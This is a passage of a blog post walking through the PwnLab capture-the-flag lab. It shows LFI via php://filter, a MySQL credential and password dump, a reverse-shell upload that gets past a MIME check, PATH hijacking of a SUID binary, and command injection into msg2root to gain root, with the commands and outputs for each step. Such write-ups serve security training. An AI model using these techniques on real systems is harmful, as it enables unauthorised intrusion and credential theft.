+|_  100024  1          60795&#x2F;udp   status
+111&#x2F;udp open  rpcbind
+| rpcinfo: 
+|   program version    port&#x2F;proto  service
+|   100000  2,3,4        111&#x2F;tcp   rpcbind
+|   100000  2,3,4        111&#x2F;udp   rpcbind
+|   100000  3,4          111&#x2F;tcp6  rpcbind
+|   100000  3,4          111&#x2F;udp6  rpcbind
+|   100024  1          33795&#x2F;tcp   status
+|   100024  1          44347&#x2F;udp6  status
+|   100024  1          50459&#x2F;tcp6  status
+|_  100024  1          60795&#x2F;udp   status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Nothing interesting</p>
+<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>I don’t have the creds so I can try to exploit now.</p>
+<h1 id="Port-80-LFI"><a href="#Port-80-LFI" class="headerlink" title="Port 80 LFI"></a>Port 80 LFI</h1><p><a href="https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/">https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/</a><br><img src="https://i.imgur.com/h4ESarw.png"><br>It’s not working for <code>/etc/passwd</code> but there is a file login and upload, I can try them.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\?page\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\&#x3D;convert.base64-encode&#x2F;resource\&#x3D;login <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>PwnLab Intranet Image Hosting<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>images/pwnlab.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>
+[ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> ] [ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?page=login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> ] [ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?page=upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Upload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> ]
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
+PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>%   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>I have to decode it, it’s in base 64.</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$server</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token variable">$luser</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$lpass</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">...</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>We also have the file <code>config.php</code>.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\?page\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\&#x3D;convert.base64-encode&#x2F;resource\&#x3D;config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">&lt;?php
+$server	  &#x3D; &quot;localhost&quot;;
+$username &#x3D; &quot;root&quot;;
+$password &#x3D; &quot;H4u%QJ_H99&quot;;
+$database &#x3D; &quot;Users&quot;;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>We have the creds for the mysql</p>
+<h1 id="Mysql-1"><a href="#Mysql-1" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="Browse-the-database"><a href="#Browse-the-database" class="headerlink" title="Browse the database"></a>Browse the database</h2><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">mysql -u root -h 192.168.0.29 -p 
+H4u%QJ_H99<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| Users              |
++--------------------+
+
+SHOW TABLES;
++-----------------+
+| Tables_in_Users |
++-----------------+
+| users           |
++-----------------+
+
+select * from users;
++------+------------------+
+| user | pass             |
++------+------------------+
+| kent | Sld6WHVCSkpOeQ&#x3D;&#x3D; |
+| mike | U0lmZHNURW42SQ&#x3D;&#x3D; |
+| kane | aVN2NVltMkdSbw&#x3D;&#x3D; |
++------+------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Decode-the-hash"><a href="#Decode-the-hash" class="headerlink" title="Decode the hash"></a>Decode the hash</h2><p>We can decode them, with a base64 decoder.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">echo &quot;Sld6WHVCSkpOeQ&#x3D;&#x3D;&quot; | base64 --decode
+JWzXuBJJNy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>kent | JWzXuBJJNy<br>mike | SIfdsTEn6I<br>kane | iSv5Ym2GRo</p>
+<h1 id="Upload-a-revershell"><a href="#Upload-a-revershell" class="headerlink" title="Upload a revershell"></a>Upload a revershell</h1><p><img src="https://i.imgur.com/vwxkbhN.png"><br>Let’s upload a revershell.<br><img src="https://i.imgur.com/ixYG5Li.png"><br>Ok let’s upload an image  ( ͡° ͜ʖ ͡°).</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">cp phprc.php rc.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/y5PFccQ.png"><br>It’s not working, let’s see the code of upload.php.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\?page\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\&#x3D;convert.base64-encode&#x2F;resource\&#x3D;upload
+
+...
+if($imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;png&#39;) &#123; die(&#39;Error 002&#39;);
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I have the error 002 because of the mime verification, I need to bypass it.<br>I have to add this code in my file.</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">GIF89aP;
+[shell]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/KhDZUsz.png"><br>After the upload I change the cookie, it was hard to find this solution.<br><img src="https://i.imgur.com/NIg4tV8.png"><br>I send the request an now i have a shell.</p>
+<pre class="line-numbers language-curl" data-language="curl"><code class="language-curl">GET &#x2F; HTTP&#x2F;1.1
+Host: 192.168.0.29
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Referer: http:&#x2F;&#x2F;192.168.0.29&#x2F;
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7
+Cookie: lang&#x3D;..&#x2F;upload&#x2F;29e8ea4a462331c5af3754eb8dbd4328.gif
+Connection: close
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/OJkXJ2r.png"></p>
+<h1 id="Connect-as-kane"><a href="#Connect-as-kane" class="headerlink" title="Connect as kane"></a>Connect as kane</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;
+su kane
+iSv5Ym2GRo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/4hlwk4f.png"><br>In the home directory we have the file <code>msgmike</code> it’s an executable.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://materials.rangeforce.com/img/suidbit/Wxdy0zn.png"><br>So it will run as mike.<br>let’s see what is inside:</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">strings ms*
+
+&#x2F;lib&#x2F;ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+setregid
+setreuid
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.0
+PTRh 
+QVh[
+[^_]
+cat &#x2F;home&#x2F;mike&#x2F;msg.txt
+;*2$&quot;(
+GCC: (Debian 4.9.2-10) 4.9.2
+GCC: (Debian 4.8.4-1) 4.8.4
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>As we can see it’s using the command cat.<br>google: <code>exploit binaries privesc suid</code>.<br><a href="https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/">https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/</a><br><img src="https://i.imgur.com/A7jOMRI.png"><br>We are using cat and not whoami.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; &#x2F;tmp&#x2F;cat 
+chmod 777 &#x2F;tmp&#x2F;cat  
+export PATH&#x3D;&#x2F;tmp:$PATH
+.&#x2F;msgmike
+id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">uid&#x3D;1002(mike) gid&#x3D;1002(mike) groups&#x3D;1002(mike),1003(kane)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/Nl3iRy3.png"><br>Now let’s see what is in the home director.<br>We have a similar programe called <code>msg2root</code>.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">strings msg2root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/AxpfXjH.png"></p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">&#x2F;bin&#x2F;echo %s &gt;&gt; &#x2F;root&#x2F;messages.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>The <code>%s</code> is like the <code>$1</code> in bash, he need an argument.<br>I will execute 2 cammmands, the first one is echo, the second one is /bin/sh.</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">A; B # Run A and then B, regardless of success of A 
+A &amp;&amp; B # Run B if and only if A succeeded 
+A || B # Run B if and only if A failed 
+A &amp; # Run A in background.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>I’m gonna use ; to execute the 2 commands.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">.&#x2F;msg2root 
+sdf;&#x2F;bin&#x2F;sh
+id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">uid&#x3D;1002(mike) gid&#x3D;1002(mike) euid&#x3D;0(root) egid&#x3D;0(root) groups&#x3D;0(root),1003(kane)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>I’m gonna display the flag.<br>Cat is broken si I’m gonna use tail.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">tail &#x2F;root&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">&#x3D;&#x3D;&gt; &#x2F;root&#x2F;flag.txt &lt;&#x3D;&#x3D;
+(__  _) this challenge.                                                 (__  _)
+(_ ___)                                                                 (_ ___)
+( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
+(__  _) reading it                                                      (__  _)
+(__  _)                                                                 (__  _)
+(__  _)                                             For sniferl4bs.com  (__  _)
+( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
+(__  _)                                                                 (__  _)
+(_ ___)-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-(_ ___)
+&#96;-._.-&#39;                                                                 &#96;-._.-&#39;
+
+&#x3D;&#x3D;&gt; &#x2F;root&#x2F;messages.txt &lt;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+       
+    </div>
+</article>
+
+
+
+
+
+    <section id="comments" class="disqus">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://peanutstick.duckdns.org/post/CTF_PwnLab.html';
+            this.page.identifier = '/post/CTF_PwnLab.html';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//peanutstick.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a>
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var isLoadComments = false;
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            if(isLoadComments){
+                return;
+            }
+            isLoadComments = true;
+            if(isLoadComments )
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").mouseenter(function(){
+            load$hide();
+        })
+    </script>
+
+
+</section>
+
+<!-- Add comment count-->
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="/post/CTF_PwnLab.html"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url="http://peanutstick.duckdns.org/post/CTF_PwnLab.html"></span>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2021 Peanutstick&#39;s Blog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
